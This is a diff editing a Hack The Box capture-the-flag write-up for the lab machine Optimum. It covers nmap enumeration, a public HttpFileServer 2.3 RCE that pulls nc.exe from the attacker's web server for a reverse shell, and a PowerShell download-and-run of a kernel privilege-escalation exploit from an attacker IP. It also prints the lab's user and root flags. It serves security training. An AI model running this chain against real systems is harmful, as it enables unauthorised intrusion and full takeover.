@@ -16,7 +16,7 @@ Optimum is a beginner-level machine which mainly focuses on enumeration of servi
 ```bash
 ┌──(root💀Shiro)-[/home/shiro]
 └─# nmap -sC -sV -A 10.10.10.8              
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 14:58 +08
+Starting Nmap 7.91 ( https://nmap.org )
 Nmap scan report for 10.10.10.8
 Host is up (0.17s latency).
 Not shown: 999 filtered ports
@@ -40,15 +40,7 @@ Nmap done: 1 IP address (1 host up) scanned in 28.69 seconds
 ```
 ![Website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Optimum/Website.png?raw=true)
 
-It seems like a normal file server? Let’s search up more about this particular server version!
-
-A quick Google search on ```HttpFileServer 2.3 Exploit``` shows this [RCE](https://www.exploit-db.com/exploits/39161) exploit. 
-
-I will be using ```gedit``` to copy the code.
-
-From the instructions of the code, it says that ```You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).```. 
-
-So let’s locate ```nc.exe```.
+The server is running `HttpFileServer 2.3 Exploit` and it is vulnerable to this [RCE](https://www.exploit-db.com/exploits/39161) exploit.  From the instructions of the code, it says that `You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).`. 
 
 ```bash
 ┌──(root💀Shiro)-[/home/shiro/HackTheBox/Optimum]
@@ -65,7 +57,7 @@ So let’s locate ```nc.exe```.
 └─# python -m SimpleHTTPServer 80
 Serving HTTP on 0.0.0.0 port 80 ...
 ```
-Now we can start a netcat listener and run the exploit `python <exploit>.py <Target IP address> <Target Port Number>`
+Now we can start a netcat listener and run the exploit using `python <exploit>.py <Target IP address> <Target Port Number>`
 ```bash
 ┌──(root💀Shiro)-[/home/shiro]
 └─# nc -nvlp 443                                                        
@@ -76,14 +68,7 @@ Ncat: Listening on 0.0.0.0:443
 ┌──(root💀Shiro)-[/home/shiro/HackTheBox/Optimum]
 └─# python rce.py 10.10.10.8 80 
 ```
-Yay, we got a shell!
-```bash
-C:\Users\kostas\Desktop>dir
-22/05/2021  06:52 ��    <DIR>          .
-22/05/2021  06:52 ��    <DIR>          ..
-18/03/2017  03:11 ��           760.320 hfs.exe
-18/03/2017  03:13 ��                32 user.txt.txt
-
+```cmd
 C:\Users\kostas\Desktop>type user.txt.txt
 d0c39409d7b994a9a1389ebf38ef5f73
 
@@ -164,27 +149,10 @@ Hyper-V Requirements:      A hypervisor has been detected. Features required for
 
 With the `systeminfo`, we can use [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) to find exploits.
 
-## Windows Exploit Suggester
-
 ```bash
 ┌──(root💀Shiro)-[/home/shiro/HackTheBox/Optimum]
 └─# ./windows-exploit-suggester.py --database 2021-05-16-mssb.xlsx --systeminfo systeminfo.txt
-
-[*] initiating winsploit version 3.3...
-[*] database file detected as xls or xlsx based on extension
-[*] attempting to read from the systeminfo input file
-[+] systeminfo input file read successfully (utf-8)
-[*] querying database file for potential vulnerabilities
-[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
-[*] there are now 246 remaining vulns
-[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
-[+] windows version identified as 'Windows 2012 R2 64-bit'
-[*] 
-[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
-[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
-[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
-[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
-[*] 
+...
 [E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
 [*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
 [*] 
@@ -210,24 +178,16 @@ Viewing the contents of the code shows that there is an executable online that w
 
 Restart our python server and then download the executable from the victim's machine.
 
-```bash
+```cmd
 C:\Users\kostas\Desktop>powershell wget "http://10.10.14.4/41020.exe" -outfile "exploit.exe"
-powershell wget "http://10.10.14.4/41020.exe" -outfile "exploit.exe"
 C:\Users\kostas\Desktop>exploit.exe
-exploit.exe
+...
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
-
 C:\Users\kostas\Desktop>whoami
-whoami
 nt authority\system
-
-C:\Users\Administrator\Desktop>dir
-18/03/2017  03:14 ��    <DIR>          .
-18/03/2017  03:14 ��    <DIR>          ..
-18/03/2017  03:14 ��                32 root.txt
-
 C:\Users\kostas\Desktop>cd C:\Users\Administrator\Desktop
 C:\Users\Administrator\Desktop>type root.txt
 51ed1b36553c8461f4552c2e92b3eeed
 ```
+
